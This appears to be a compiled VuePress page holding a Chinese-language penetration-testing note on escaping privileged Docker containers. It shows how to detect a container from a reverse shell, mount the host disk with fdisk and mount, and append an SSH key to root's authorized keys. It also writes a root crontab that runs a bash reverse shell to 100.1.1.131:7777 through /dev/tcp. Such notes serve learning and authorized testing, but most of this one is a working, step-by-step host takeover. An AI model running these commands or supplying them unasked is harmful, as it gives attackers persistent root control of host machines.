import{_ as e}from"./plugin-vue_export-helper-DlAUqK2U.js";import{o as a,c as s,e as l}from"./app-DxMJFouC.js";const n={},i=l(`<h1 id="docker" tabindex="-1"><a class="header-anchor" href="#docker"><span>Docker</span></a></h1><ul><li><a href="#docker">Docker</a><ul><li><a href="#docker%E9%80%83%E9%80%B8">Docker逃逸</a><ul><li><a href="#%E5%8F%8D%E5%BC%B9-shell-%E4%B8%AD%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E8%87%AA%E5%B7%B1%E6%98%AF%E5%90%A6%E5%9C%A8-docker-%E5%AE%B9%E5%99%A8%E4%B8%AD">反弹 shell 中如何判断自己是否在 docker 容器中</a></li><li><a href="#%E7%89%B9%E6%9D%83%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%E5%8F%8D%E5%BC%B9shell%E5%88%B0%E7%89%B9%E6%9D%83%E6%A8%A1%E5%BC%8F%E7%9A%84docker%E5%AE%B9%E5%99%A8%E5%90%8E%E8%BF%9B%E4%B8%80%E6%AD%A5%E8%8E%B7%E5%8F%96%E5%AE%BF%E4%B8%BB%E6%9C%BA%E6%9D%83%E9%99%90">特权容器逃逸(反弹shell到特权模式的docker容器后进一步获取宿主机权限)</a><ul><li><a href="#%E5%86%99%E5%85%AC%E9%92%A5">写公钥</a></li><li><a href="#%E5%86%99%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1">写定时任务</a></li></ul></li></ul></li></ul></li></ul><hr><h2 id="docker逃逸" tabindex="-1"><a class="header-anchor" href="#docker逃逸"><span>Docker逃逸</span></a></h2><h3 id="反弹-shell-中如何判断自己是否在-docker-容器中" tabindex="-1"><a class="header-anchor" href="#反弹-shell-中如何判断自己是否在-docker-容器中"><span>反弹 shell 中如何判断自己是否在 docker 容器中</span></a></h3><ul><li><p>看当前反弹 shell 的主机名称, 一堆数字字母的则可能是 docker 容器 id</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202306190004059.png" alt="image-20230619000402010"></p></li><li><p>查看根目录下有没有 <code>.dockerenv</code> 文件, 如果有的话则可能在 docker 环境中</p><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code><span class="token function">ls</span> <span class="token parameter variable">-alh</span> /.dockerenv
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><img src="http://cdn.ayusummer233.top/DailyNotes/202306182307643.png" alt="image-20230618230722588"></p></li></ul><hr><h3 id="特权容器逃逸-反弹shell到特权模式的docker容器后进一步获取宿主机权限" tabindex="-1"><a class="header-anchor" href="#特权容器逃逸-反弹shell到特权模式的docker容器后进一步获取宿主机权限"><span>特权容器逃逸(反弹shell到特权模式的docker容器后进一步获取宿主机权限)</span></a></h3><p>在判断当前反弹shell位置为docker后可以尝试查看下系统中的所有银盘分区表信息</p><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code><span class="token function">fdisk</span> <span class="token parameter variable">-l</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>如果没有输出则不是特权模式启动的 Docker 容器</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202306190958112.png" alt="image-20230619095827529"></p><p>如果有输出则可以观察 Device 了</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202306191001591.png" alt="image-20230619100109506"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202306191001794.png" alt="image-20230619100145688"></p><p>上图Type 为 Linux 的这条即为宿主机的系统分区</p><blockquote><p>遇到过宿主是实体机固态装系统+一块机械时, 特权容器启动的 docker 能看到机械硬盘所在的分区, 系统分区显示的 <code> /dev/nvme0n1p1</code> 和 <code> /dev/nvme0n1p2</code>, 一个 PE 一个 LinuxVM 似乎(也许不是 LinuxVM, 不过一定不是LINUX, TODO: 记得确认下), 此时只能再用 <code>lvdisplay</code> 找逻辑卷, 不过这条命令 Docker 容器中不一定有</p></blockquote><p>看到系统分区后可以在容器中新建一个目录然后挂载该分区</p><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code><span class="token function">mkdir</span> /joker
<span class="token function">mount</span> /dev/sda5 /joker
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="http://cdn.ayusummer233.top/DailyNotes/202306191016670.png" alt="image-20230619101649612"></p><hr><h5 id="写公钥" tabindex="-1"><a class="header-anchor" href="#写公钥"><span>写公钥</span></a></h5><p>可以尝试写 root 账户的公钥</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202306191022850.png" alt="image-20230619102252795"></p><p>在本机新建一对密钥</p><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code>ssh-keygen <span class="token parameter variable">-t</span> rsa <span class="token parameter variable">-C</span> <span class="token string">&quot;xxl-job&quot;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><blockquote><p><code>-C(comment)</code> 随便填, 有辨识度就行</p></blockquote><p>在命令执行的交互中可以设置密钥存放的路径, 然后根据回显找到 <code>.pub</code> 公钥</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202306191028353.png" alt="image-20230619102802288"></p><p>然后直接用 <code>echo &gt;&gt;</code> 来续写即可</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202306191029155.png" alt="image-20230619102953093"></p><p>然后就可以 cat 看下了, 顺利的话已经写进去了</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202306191030673.png" alt="image-20230619103048603"></p><p>然后可以直接 ssh 连接到宿主机了</p><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code><span class="token function">ssh</span> <span class="token parameter variable">-i</span> id_rsa root@xxx
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><img src="http://cdn.ayusummer233.top/DailyNotes/202306191034575.png" alt="image-20230619103459517"></p><hr><h5 id="写定时任务" tabindex="-1"><a class="header-anchor" href="#写定时任务"><span>写定时任务</span></a></h5><p>ubuntu 默认没有 MTA, 因此执行定时任务可能会报这样的错:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202306260751798.png" alt="image-20230626075128404"></p><p>所以需要在定时任务中第一行写上 <code>MAILTO=&quot;&quot;</code> 以禁用邮件输出</p><p>此外直接写 <code>bash -i &gt;&amp; /dev/tcp/100.1.1.131/7777 0&gt;&amp;1</code> 到定时任务中不一定行得通, 可以写个脚本, 然后定时任务调脚本执行, 比如:</p><p><code>test.sh</code>:</p><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code><span class="token shebang important">#!/bin/bash</span>
<span class="token function">bash</span> <span class="token parameter variable">-i</span> <span class="token operator">&gt;&amp;</span> /dev/tcp/100.1.1.131/7777  <span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span><span class="token file-descriptor important">&amp;1</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p><code>/var/spool/cron/crontabs/root</code>:</p><div class="language-text line-numbers-mode" data-ext="text" data-title="text"><pre class="language-text"><code>MAILTO=&quot;&quot;
* * * * * /bin/bash test.sh
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><hr>`,47),t=[i];function r(d,c){return a(),s("div",null,t)}const h=e(n,[["render",r],["__file","index.html.vue"]]),E=JSON.parse('{"path":"/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E7%AB%AF%E7%82%B9%E5%AE%89%E5%85%A8/Docker/","title":"Docker","lang":"zh-CN","frontmatter":{},"headers":[{"level":2,"title":"Docker逃逸","slug":"docker逃逸","link":"#docker逃逸","children":[{"level":3,"title":"反弹 shell 中如何判断自己是否在 docker 容器中","slug":"反弹-shell-中如何判断自己是否在-docker-容器中","link":"#反弹-shell-中如何判断自己是否在-docker-容器中","children":[]},{"level":3,"title":"特权容器逃逸(反弹shell到特权模式的docker容器后进一步获取宿主机权限)","slug":"特权容器逃逸-反弹shell到特权模式的docker容器后进一步获取宿主机权限","link":"#特权容器逃逸-反弹shell到特权模式的docker容器后进一步获取宿主机权限","children":[]}]}],"git":{"createdTime":1715323036000,"updatedTime":1715323036000,"contributors":[{"name":"233JG","email":"ayusummer233@gmail.com","commits":1}]},"readingTime":{"minutes":2.37,"words":711},"filePathRelative":"网络安全/端点安全/Docker/index.md","localizedDate":"2024年5月10日","excerpt":"\\n<ul>\\n<li><a href=\\"#docker\\">Docker</a>\\n<ul>\\n<li><a href=\\"#docker%E9%80%83%E9%80%B8\\">Docker逃逸</a>\\n<ul>\\n<li><a href=\\"#%E5%8F%8D%E5%BC%B9-shell-%E4%B8%AD%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E8%87%AA%E5%B7%B1%E6%98%AF%E5%90%A6%E5%9C%A8-docker-%E5%AE%B9%E5%99%A8%E4%B8%AD\\">反弹 shell 中如何判断自己是否在 docker 容器中</a></li>\\n<li><a href=\\"#%E7%89%B9%E6%9D%83%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%E5%8F%8D%E5%BC%B9shell%E5%88%B0%E7%89%B9%E6%9D%83%E6%A8%A1%E5%BC%8F%E7%9A%84docker%E5%AE%B9%E5%99%A8%E5%90%8E%E8%BF%9B%E4%B8%80%E6%AD%A5%E8%8E%B7%E5%8F%96%E5%AE%BF%E4%B8%BB%E6%9C%BA%E6%9D%83%E9%99%90\\">特权容器逃逸(反弹shell到特权模式的docker容器后进一步获取宿主机权限)</a>\\n<ul>\\n<li><a href=\\"#%E5%86%99%E5%85%AC%E9%92%A5\\">写公钥</a></li>\\n<li><a href=\\"#%E5%86%99%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1\\">写定时任务</a></li>\\n</ul>\\n</li>\\n</ul>\\n</li>\\n</ul>\\n</li>\\n</ul>"}');export{h as comp,E as data};
